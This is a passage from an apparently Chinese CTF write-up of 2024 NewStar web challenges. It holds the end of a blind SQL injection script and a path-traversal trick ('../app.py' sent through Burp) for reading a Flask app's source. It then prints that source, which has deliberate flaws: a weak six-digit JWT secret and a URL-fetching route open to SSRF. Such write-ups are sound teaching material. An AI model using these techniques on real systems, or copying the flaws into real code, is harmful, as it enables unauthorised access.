+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] 当前结果: </span><span class="si">{</span><span class="n">result</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] 当前结果: </span><span class="si">{</span><span class="n">result</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这题依旧与newstar那个时间盲注一样有空格，所有不要break</p>
+<h2 id="这照片是你吗"><strong>这「照片」是你吗</strong>
+</h2><p>查看源码要找源码，那不出是要路径穿越了，看了看框架是flask，直接在bp上发包../app.py拿到源码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">tips:若直接在浏览器中访问带 ../ 的路径，会先被浏览器按照网址路径规则解析一遍 ../，最终发出的并不是含这个字符串的路径。
+</span></span><span class="line"><span class="cl">示例：若用户输入 http://example.com/dir1/../file.txt，浏览器会将其解析为 http://example.com/file.txt，实际请求路径不含 ../。原理：../ 表示回退到上一级目录，浏览器会直接计算最终路径并发送，而非保留原始符号。
+</span></span><span class="line"><span class="cl">因此需要用发包软件发送过去。
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/2024newstar-web/image-20250521100748612.png"
+	width="495"
+	height="118"
+	srcset="/p/2024newstar-web/image-20250521100748612_hu_6c4f06da1909b17d.png 480w, /p/2024newstar-web/image-20250521100748612_hu_17979aab2cd7afb5.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250521100748612"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="419"
+		data-flex-basis="1006px"
+	
+></p>
+<img src="image-20250521101043513.png" alt="image-20250521101043513" style="zoom: 50%;" />
+<p>来看看源码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span><span class="lnt">117
+</span><span class="lnt">118
+</span><span class="lnt">119
+</span><span class="lnt">120
+</span><span class="lnt">121
+</span><span class="lnt">122
+</span><span class="lnt">123
+</span><span class="lnt">124
+</span><span class="lnt">125
+</span><span class="lnt">126
+</span><span class="lnt">127
+</span><span class="lnt">128
+</span><span class="lnt">129
+</span><span class="lnt">130
+</span><span class="lnt">131
+</span><span class="lnt">132
+</span><span class="lnt">133
+</span><span class="lnt">134
+</span><span class="lnt">135
+</span><span class="lnt">136
+</span><span class="lnt">137
+</span><span class="lnt">138
+</span><span class="lnt">139
+</span><span class="lnt">140
+</span><span class="lnt">141
+</span><span class="lnt">142
+</span><span class="lnt">143
+</span><span class="lnt">144
+</span><span class="lnt">145
+</span><span class="lnt">146
+</span><span class="lnt">147
+</span><span class="lnt">148
+</span><span class="lnt">149
+</span><span class="lnt">150
+</span><span class="lnt">151
+</span><span class="lnt">152
+</span><span class="lnt">153
+</span><span class="lnt">154
+</span><span class="lnt">155
+</span><span class="lnt">156
+</span><span class="lnt">157
+</span><span class="lnt">158
+</span><span class="lnt">159
+</span><span class="lnt">160
+</span><span class="lnt">161
+</span><span class="lnt">162
+</span><span class="lnt">163
+</span><span class="lnt">164
+</span><span class="lnt">165
+</span><span class="lnt">166
+</span><span class="lnt">167
+</span><span class="lnt">168
+</span><span class="lnt">169
+</span><span class="lnt">170
+</span><span class="lnt">171
+</span><span class="lnt">172
+</span><span class="lnt">173
+</span><span class="lnt">174
+</span><span class="lnt">175
+</span><span class="lnt">176
+</span><span class="lnt">177
+</span><span class="lnt">178
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">make_response</span><span class="p">,</span> <span class="n">render_template_string</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">redirect</span><span class="p">,</span> <span class="n">send_file</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">uuid</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">jwt</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flag</span> <span class="kn">import</span> <span class="n">get_random_number_string</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">base_key</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">uuid</span><span class="o">.</span><span class="n">uuid4</span><span class="p">())</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;-&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">secret_key</span> <span class="o">=</span> <span class="n">get_random_number_string</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">admin_pass</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span> <span class="n">_</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="n">base_key</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">admin_pass</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">failure_count</span> <span class="o">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">users</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;admin&#39;</span><span class="p">:</span> <span class="n">admin_pass</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;amiya&#39;</span><span class="p">:</span> <span class="s2">&#34;114514&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">verify_token</span><span class="p">(</span><span class="n">token</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">global</span> <span class="n">failure_count</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">failure_count</span> <span class="o">&gt;=</span> <span class="mi">100</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">make_response</span><span class="p">(</span><span class="s2">&#34;You have tried too many times! Please restart the service!&#34;</span><span class="p">,</span> <span class="mi">403</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="n">jwt</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">token</span><span class="p">,</span> <span class="n">secret_key</span><span class="p">,</span> <span class="n">algorithms</span><span class="o">=</span><span class="p">[</span><span class="s2">&#34;HS256&#34;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">data</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;user&#39;</span><span class="p">)</span> <span class="o">!=</span> <span class="s1">&#39;admin&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">failure_count</span> <span class="o">+=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">make_response</span><span class="p">(</span><span class="s2">&#34;You are not admin!&lt;br&gt;&lt;img src=&#39;/3.png&#39;&gt;&#34;</span><span class="p">,</span> <span class="mi">403</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">make_response</span><span class="p">(</span><span class="s2">&#34;Token is invalid!&lt;br&gt;&lt;img src=&#39;/3.png&#39;&gt;&#34;</span><span class="p">,</span> <span class="mi">401</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="kc">True</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="s2">&#34;/home&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/login&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">login</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">username</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">password</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="n">failure_count</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">failure_count</span> <span class="o">&gt;=</span> <span class="mi">100</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">make_response</span><span class="p">(</span><span class="s2">&#34;You have tried too many times! Please restart the service!&#34;</span><span class="p">,</span> <span class="mi">403</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">users</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">username</span><span class="p">)</span><span class="o">==</span><span class="n">password</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">token</span> <span class="o">=</span> <span class="n">jwt</span><span class="o">.</span><span class="n">encode</span><span class="p">({</span><span class="s1">&#39;user&#39;</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span> <span class="s1">&#39;exp&#39;</span><span class="p">:</span> <span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">())</span> <span class="o">+</span> <span class="mi">600</span><span class="p">},</span> <span class="n">secret_key</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">response</span> <span class="o">=</span> <span class="n">make_response</span><span class="p">(</span><span class="s1">&#39;Login success!&lt;br&gt;&lt;a href=&#34;/home&#34;&gt;Go to homepage&lt;/a&gt;&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">response</span><span class="o">.</span><span class="n">set_cookie</span><span class="p">(</span><span class="s1">&#39;token&#39;</span><span class="p">,</span> <span class="n">token</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">response</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">failure_count</span> <span class="o">+=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">make_response</span><span class="p">(</span><span class="s1">&#39;Could not verify!&lt;br&gt;&lt;img src=&#34;/3.png&#34;&gt;&#39;</span><span class="p">,</span> <span class="mi">401</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/logout&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">logout</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">response</span> <span class="o">=</span> <span class="n">make_response</span><span class="p">(</span><span class="s1">&#39;Logout success!&lt;br&gt;&lt;a href=&#34;/home&#34;&gt;Go to homepage&lt;/a&gt;&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">response</span><span class="o">.</span><span class="n">set_cookie</span><span class="p">(</span><span class="s1">&#39;token&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="n">expires</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">response</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/home&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">home</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">logged_in</span> <span class="o">=</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">token</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;token&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="n">jwt</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">token</span><span class="p">,</span> <span class="n">secret_key</span><span class="p">,</span> <span class="n">algorithms</span><span class="o">=</span><span class="p">[</span><span class="s2">&#34;HS256&#34;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">        <span class="n">text</span> <span class="o">=</span> <span class="s2">&#34;Hello, </span><span class="si">%s</span><span class="s2">!&#34;</span> <span class="o">%</span> <span class="n">data</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;user&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">logged_in</span> <span class="o">=</span> <span class="kc">True</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">logged_in</span> <span class="o">=</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl">        <span class="n">text</span> <span class="o">=</span> <span class="s2">&#34;You have not logged in!&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="p">{}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;&#39;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">        &lt;!DOCTYPE html&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">        &lt;html&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">        &lt;head&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">            &lt;title&gt;Home Page&lt;/title&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">        &lt;/head&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">        &lt;body&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">            &lt;!-- 图标能够正常显示耶! --&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">            &lt;!-- 但是我好像没有看到Nginx或者Apache之类的东西 --&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">            &lt;!-- 说明服务器脚本能够处理静态文件捏 --&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">            &lt;!-- 那源码是不是可以用某些办法拿到呢! --&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">            {{ text }}&lt;br&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">            {</span><span class="si">% i</span><span class="s1">f logged_in %}
+</span></span></span><span class="line"><span class="cl"><span class="s1">            &lt;a href=&#34;/logout&#34;&gt;登出&lt;/a&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">            {</span><span class="si">% e</span><span class="s1">lse %}
+</span></span></span><span class="line"><span class="cl"><span class="s1">            &lt;h2&gt;登录&lt;/h2&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">            &lt;form action=&#34;/login&#34; method=&#34;post&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">                用户名: &lt;input type=&#34;text&#34; name=&#34;username&#34;&gt;&lt;br&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">                密码: &lt;input type=&#34;password&#34; name=&#34;password&#34;&gt;&lt;br&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">                &lt;input type=&#34;submit&#34; value=&#34;登录&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">            &lt;/form&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">            {</span><span class="si">% e</span><span class="s1">ndif %}
+</span></span></span><span class="line"><span class="cl"><span class="s1">            &lt;br&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">            {</span><span class="si">% i</span><span class="s1">f user==&#34;admin&#34; %}
+</span></span></span><span class="line"><span class="cl"><span class="s1">            &lt;a href=&#34;/admin&#34;&gt;Go to admin panel&lt;/a&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">            &lt;img src=&#34;/2.png&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">            {</span><span class="si">% e</span><span class="s1">lse %}
+</span></span></span><span class="line"><span class="cl"><span class="s1">            &lt;img src=&#34;/1.png&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">            {</span><span class="si">% e</span><span class="s1">ndif %}
+</span></span></span><span class="line"><span class="cl"><span class="s1">        &lt;/body&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">        &lt;/html&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">    &#39;&#39;&#39;</span><span class="p">,</span> <span class="n">text</span><span class="o">=</span><span class="n">text</span><span class="p">,</span> <span class="n">logged_in</span><span class="o">=</span><span class="n">logged_in</span><span class="p">,</span> <span class="n">user</span><span class="o">=</span><span class="n">data</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;user&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/admin&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">admin</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">token</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;token&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">verify_token</span><span class="p">(</span><span class="n">token</span><span class="p">)</span> <span class="o">!=</span> <span class="kc">True</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">verify_token</span><span class="p">(</span><span class="n">token</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">resp_text</span> <span class="o">=</span> <span class="n">render_template_string</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;&#39;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">            &lt;!DOCTYPE html&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">            &lt;html&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">            &lt;head&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">                &lt;title&gt;Admin Panel&lt;/title&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">            &lt;/head&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">            &lt;body&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">                &lt;h1&gt;Admin Panel&lt;/h1&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">                &lt;p&gt;GET Server Info from api:&lt;/p&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">                &lt;input type=&#34;input&#34; value={{api_url}} id=&#34;api&#34; readonly&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">                &lt;button onclick=execute()&gt;Execute&lt;/button&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">                &lt;script&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">                    function execute() {
+</span></span></span><span class="line"><span class="cl"><span class="s1">                        fetch(&#34;{{url}}/execute?api_address=&#34;+document.getElementById(&#34;api&#34;).value,
+</span></span></span><span class="line"><span class="cl"><span class="s1">                                      {credentials: &#34;include&#34;}
+</span></span></span><span class="line"><span class="cl"><span class="s1">                                      ).then(res =&gt; res.text()).then(data =&gt; {
+</span></span></span><span class="line"><span class="cl"><span class="s1">                            document.write(data);
+</span></span></span><span class="line"><span class="cl"><span class="s1">                        });
+</span></span></span><span class="line"><span class="cl"><span class="s1">                    }
+</span></span></span><span class="line"><span class="cl"><span class="s1">                &lt;/script&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">            &lt;/body&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">            &lt;/html&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">        &#39;&#39;&#39;</span><span class="p">,</span> <span class="n">api_url</span><span class="o">=</span><span class="n">request</span><span class="o">.</span><span class="n">host_url</span><span class="o">+</span><span class="s2">&#34;/api&#34;</span><span class="p">,</span> <span class="n">url</span><span class="o">=</span><span class="n">request</span><span class="o">.</span><span class="n">host_url</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">resp</span> <span class="o">=</span> <span class="n">make_response</span><span class="p">(</span><span class="n">resp_text</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">resp</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s1">&#39;Access-Control-Allow-Credentials&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;true&#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">resp</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">make_response</span><span class="p">(</span><span class="s2">&#34;Token is invalid!&lt;br&gt;&lt;img src=&#39;/3.png&#39;&gt;&#34;</span><span class="p">,</span> <span class="mi">401</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/execute&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">execute</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">token</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;token&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">verify_token</span><span class="p">(</span><span class="n">token</span><span class="p">)</span> <span class="o">!=</span> <span class="kc">True</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">verify_token</span><span class="p">(</span><span class="n">token</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">api_address</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;api_address&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">api_address</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">make_response</span><span class="p">(</span><span class="s2">&#34;No api address!&#34;</span><span class="p">,</span> <span class="mi">400</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">api_address</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;token&#39;</span><span class="p">:</span> <span class="n">token</span><span class="p">})</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s2">&#34;/api&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">api</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">token</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;token&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">verify_token</span><span class="p">(</span><span class="n">token</span><span class="p">)</span> <span class="o">!=</span> <span class="kc">True</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">verify_token</span><span class="p">(</span><span class="n">token</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">resp</span> <span class="o">=</span> <span class="n">make_response</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Server Info: </span><span class="si">{</span><span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;uname -a&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
